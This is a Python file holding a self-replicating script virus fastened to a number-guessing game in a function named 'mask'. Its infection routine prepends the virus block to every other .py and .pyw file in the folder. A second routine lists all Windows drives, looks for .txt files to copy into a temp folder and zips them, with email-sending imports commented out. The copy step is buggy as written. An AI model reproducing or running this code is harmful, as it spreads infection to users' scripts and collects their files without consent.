###Start#####
import threading
def infection():
    import sys, glob
    code = []

    with open(sys.argv[0],'r') as f:
        lines = f.readlines()

    virus_area = False

    for line in lines:
        if "###Start#####" in line:
            virus_area = True
        if virus_area:
            code.append(line)
        if "###End#####" in line and "if" not in line:
            break

    scrips = glob.glob('*.py') + glob.glob('*.pyw')

    for scrip in scrips:
        with open(scrip, 'r') as f:
            scrip_code = f.readlines()
        infected = False
        for line_scr in scrip_code:
            if "###Start#####" in line_scr:
                infected = True
                break
        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend("\n")
            final_code.extend(scrip_code)

            with open(scrip,'w') as f:
                f.writelines(final_code)


# Malicious peice of code
def Malicious():
    import string ,os ,shutil
    from ctypes import windll

    #Scan & create temp folder
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    
    access = drives[-2] + ":\\temp"

    if not os.path.exists(access):
        os.makedirs(access)
    
    dst_dir = access
    filePath = ''

    for D in drives:
        src_dir = D + ':\\'
        for dirPath, subdirs, files in os.walk(src_dir):
            for x in files:
                if x.endswith('.txt'):
                    try:
                        file = os.path.join(dirPath, x)
                        shutil.copy(filePath, dst_dir)
                    except:
                        pass
    file_send = shutil.make_archive('Data','zip',access)

    #import smtplib
    #import email.mime.multipart


#T1 = threading.Thread(target=infection)
#T1.start()
###End#####
def mask():
    import random
    import math
    # Taking Inputs
    lower = int(input("Enter Lower bound:- "))

    # Taking Inputs
    upper = int(input("Enter Upper bound:- "))

    # generating random number between
    # the lower and upper
    x = random.randint(lower, upper)
    print("\n\tYou've only ",
        round(math.log(upper - lower + 1, 2)),
        " chances to guess the integer!\n")

    # Initializing the number of guesses.
    count = 0

    # for calculation of minimum number of
    # guesses depends upon range
    while count < math.log(upper - lower + 1, 2):
        count += 1

        # taking guessing number as input
        guess = int(input("Guess a number:- "))

        # Condition testing
        if x == guess:
            print("Congratulations you did it in ",
                count, " try")
            break
        elif x > guess:
            print("You guessed too small!")
        elif x < guess:
            print("You Guessed too high!")

    # If Guessing is more than required guesses,
    # shows this output.
    if count >= math.log(upper - lower + 1, 2):
        print("\nThe number is %d" % x)
        print("\tBetter Luck Next time!")

    # Better to use This source Code on pycharm!


#T2 = threading.Thread(target=mask)
#T2.start()
Malicious()
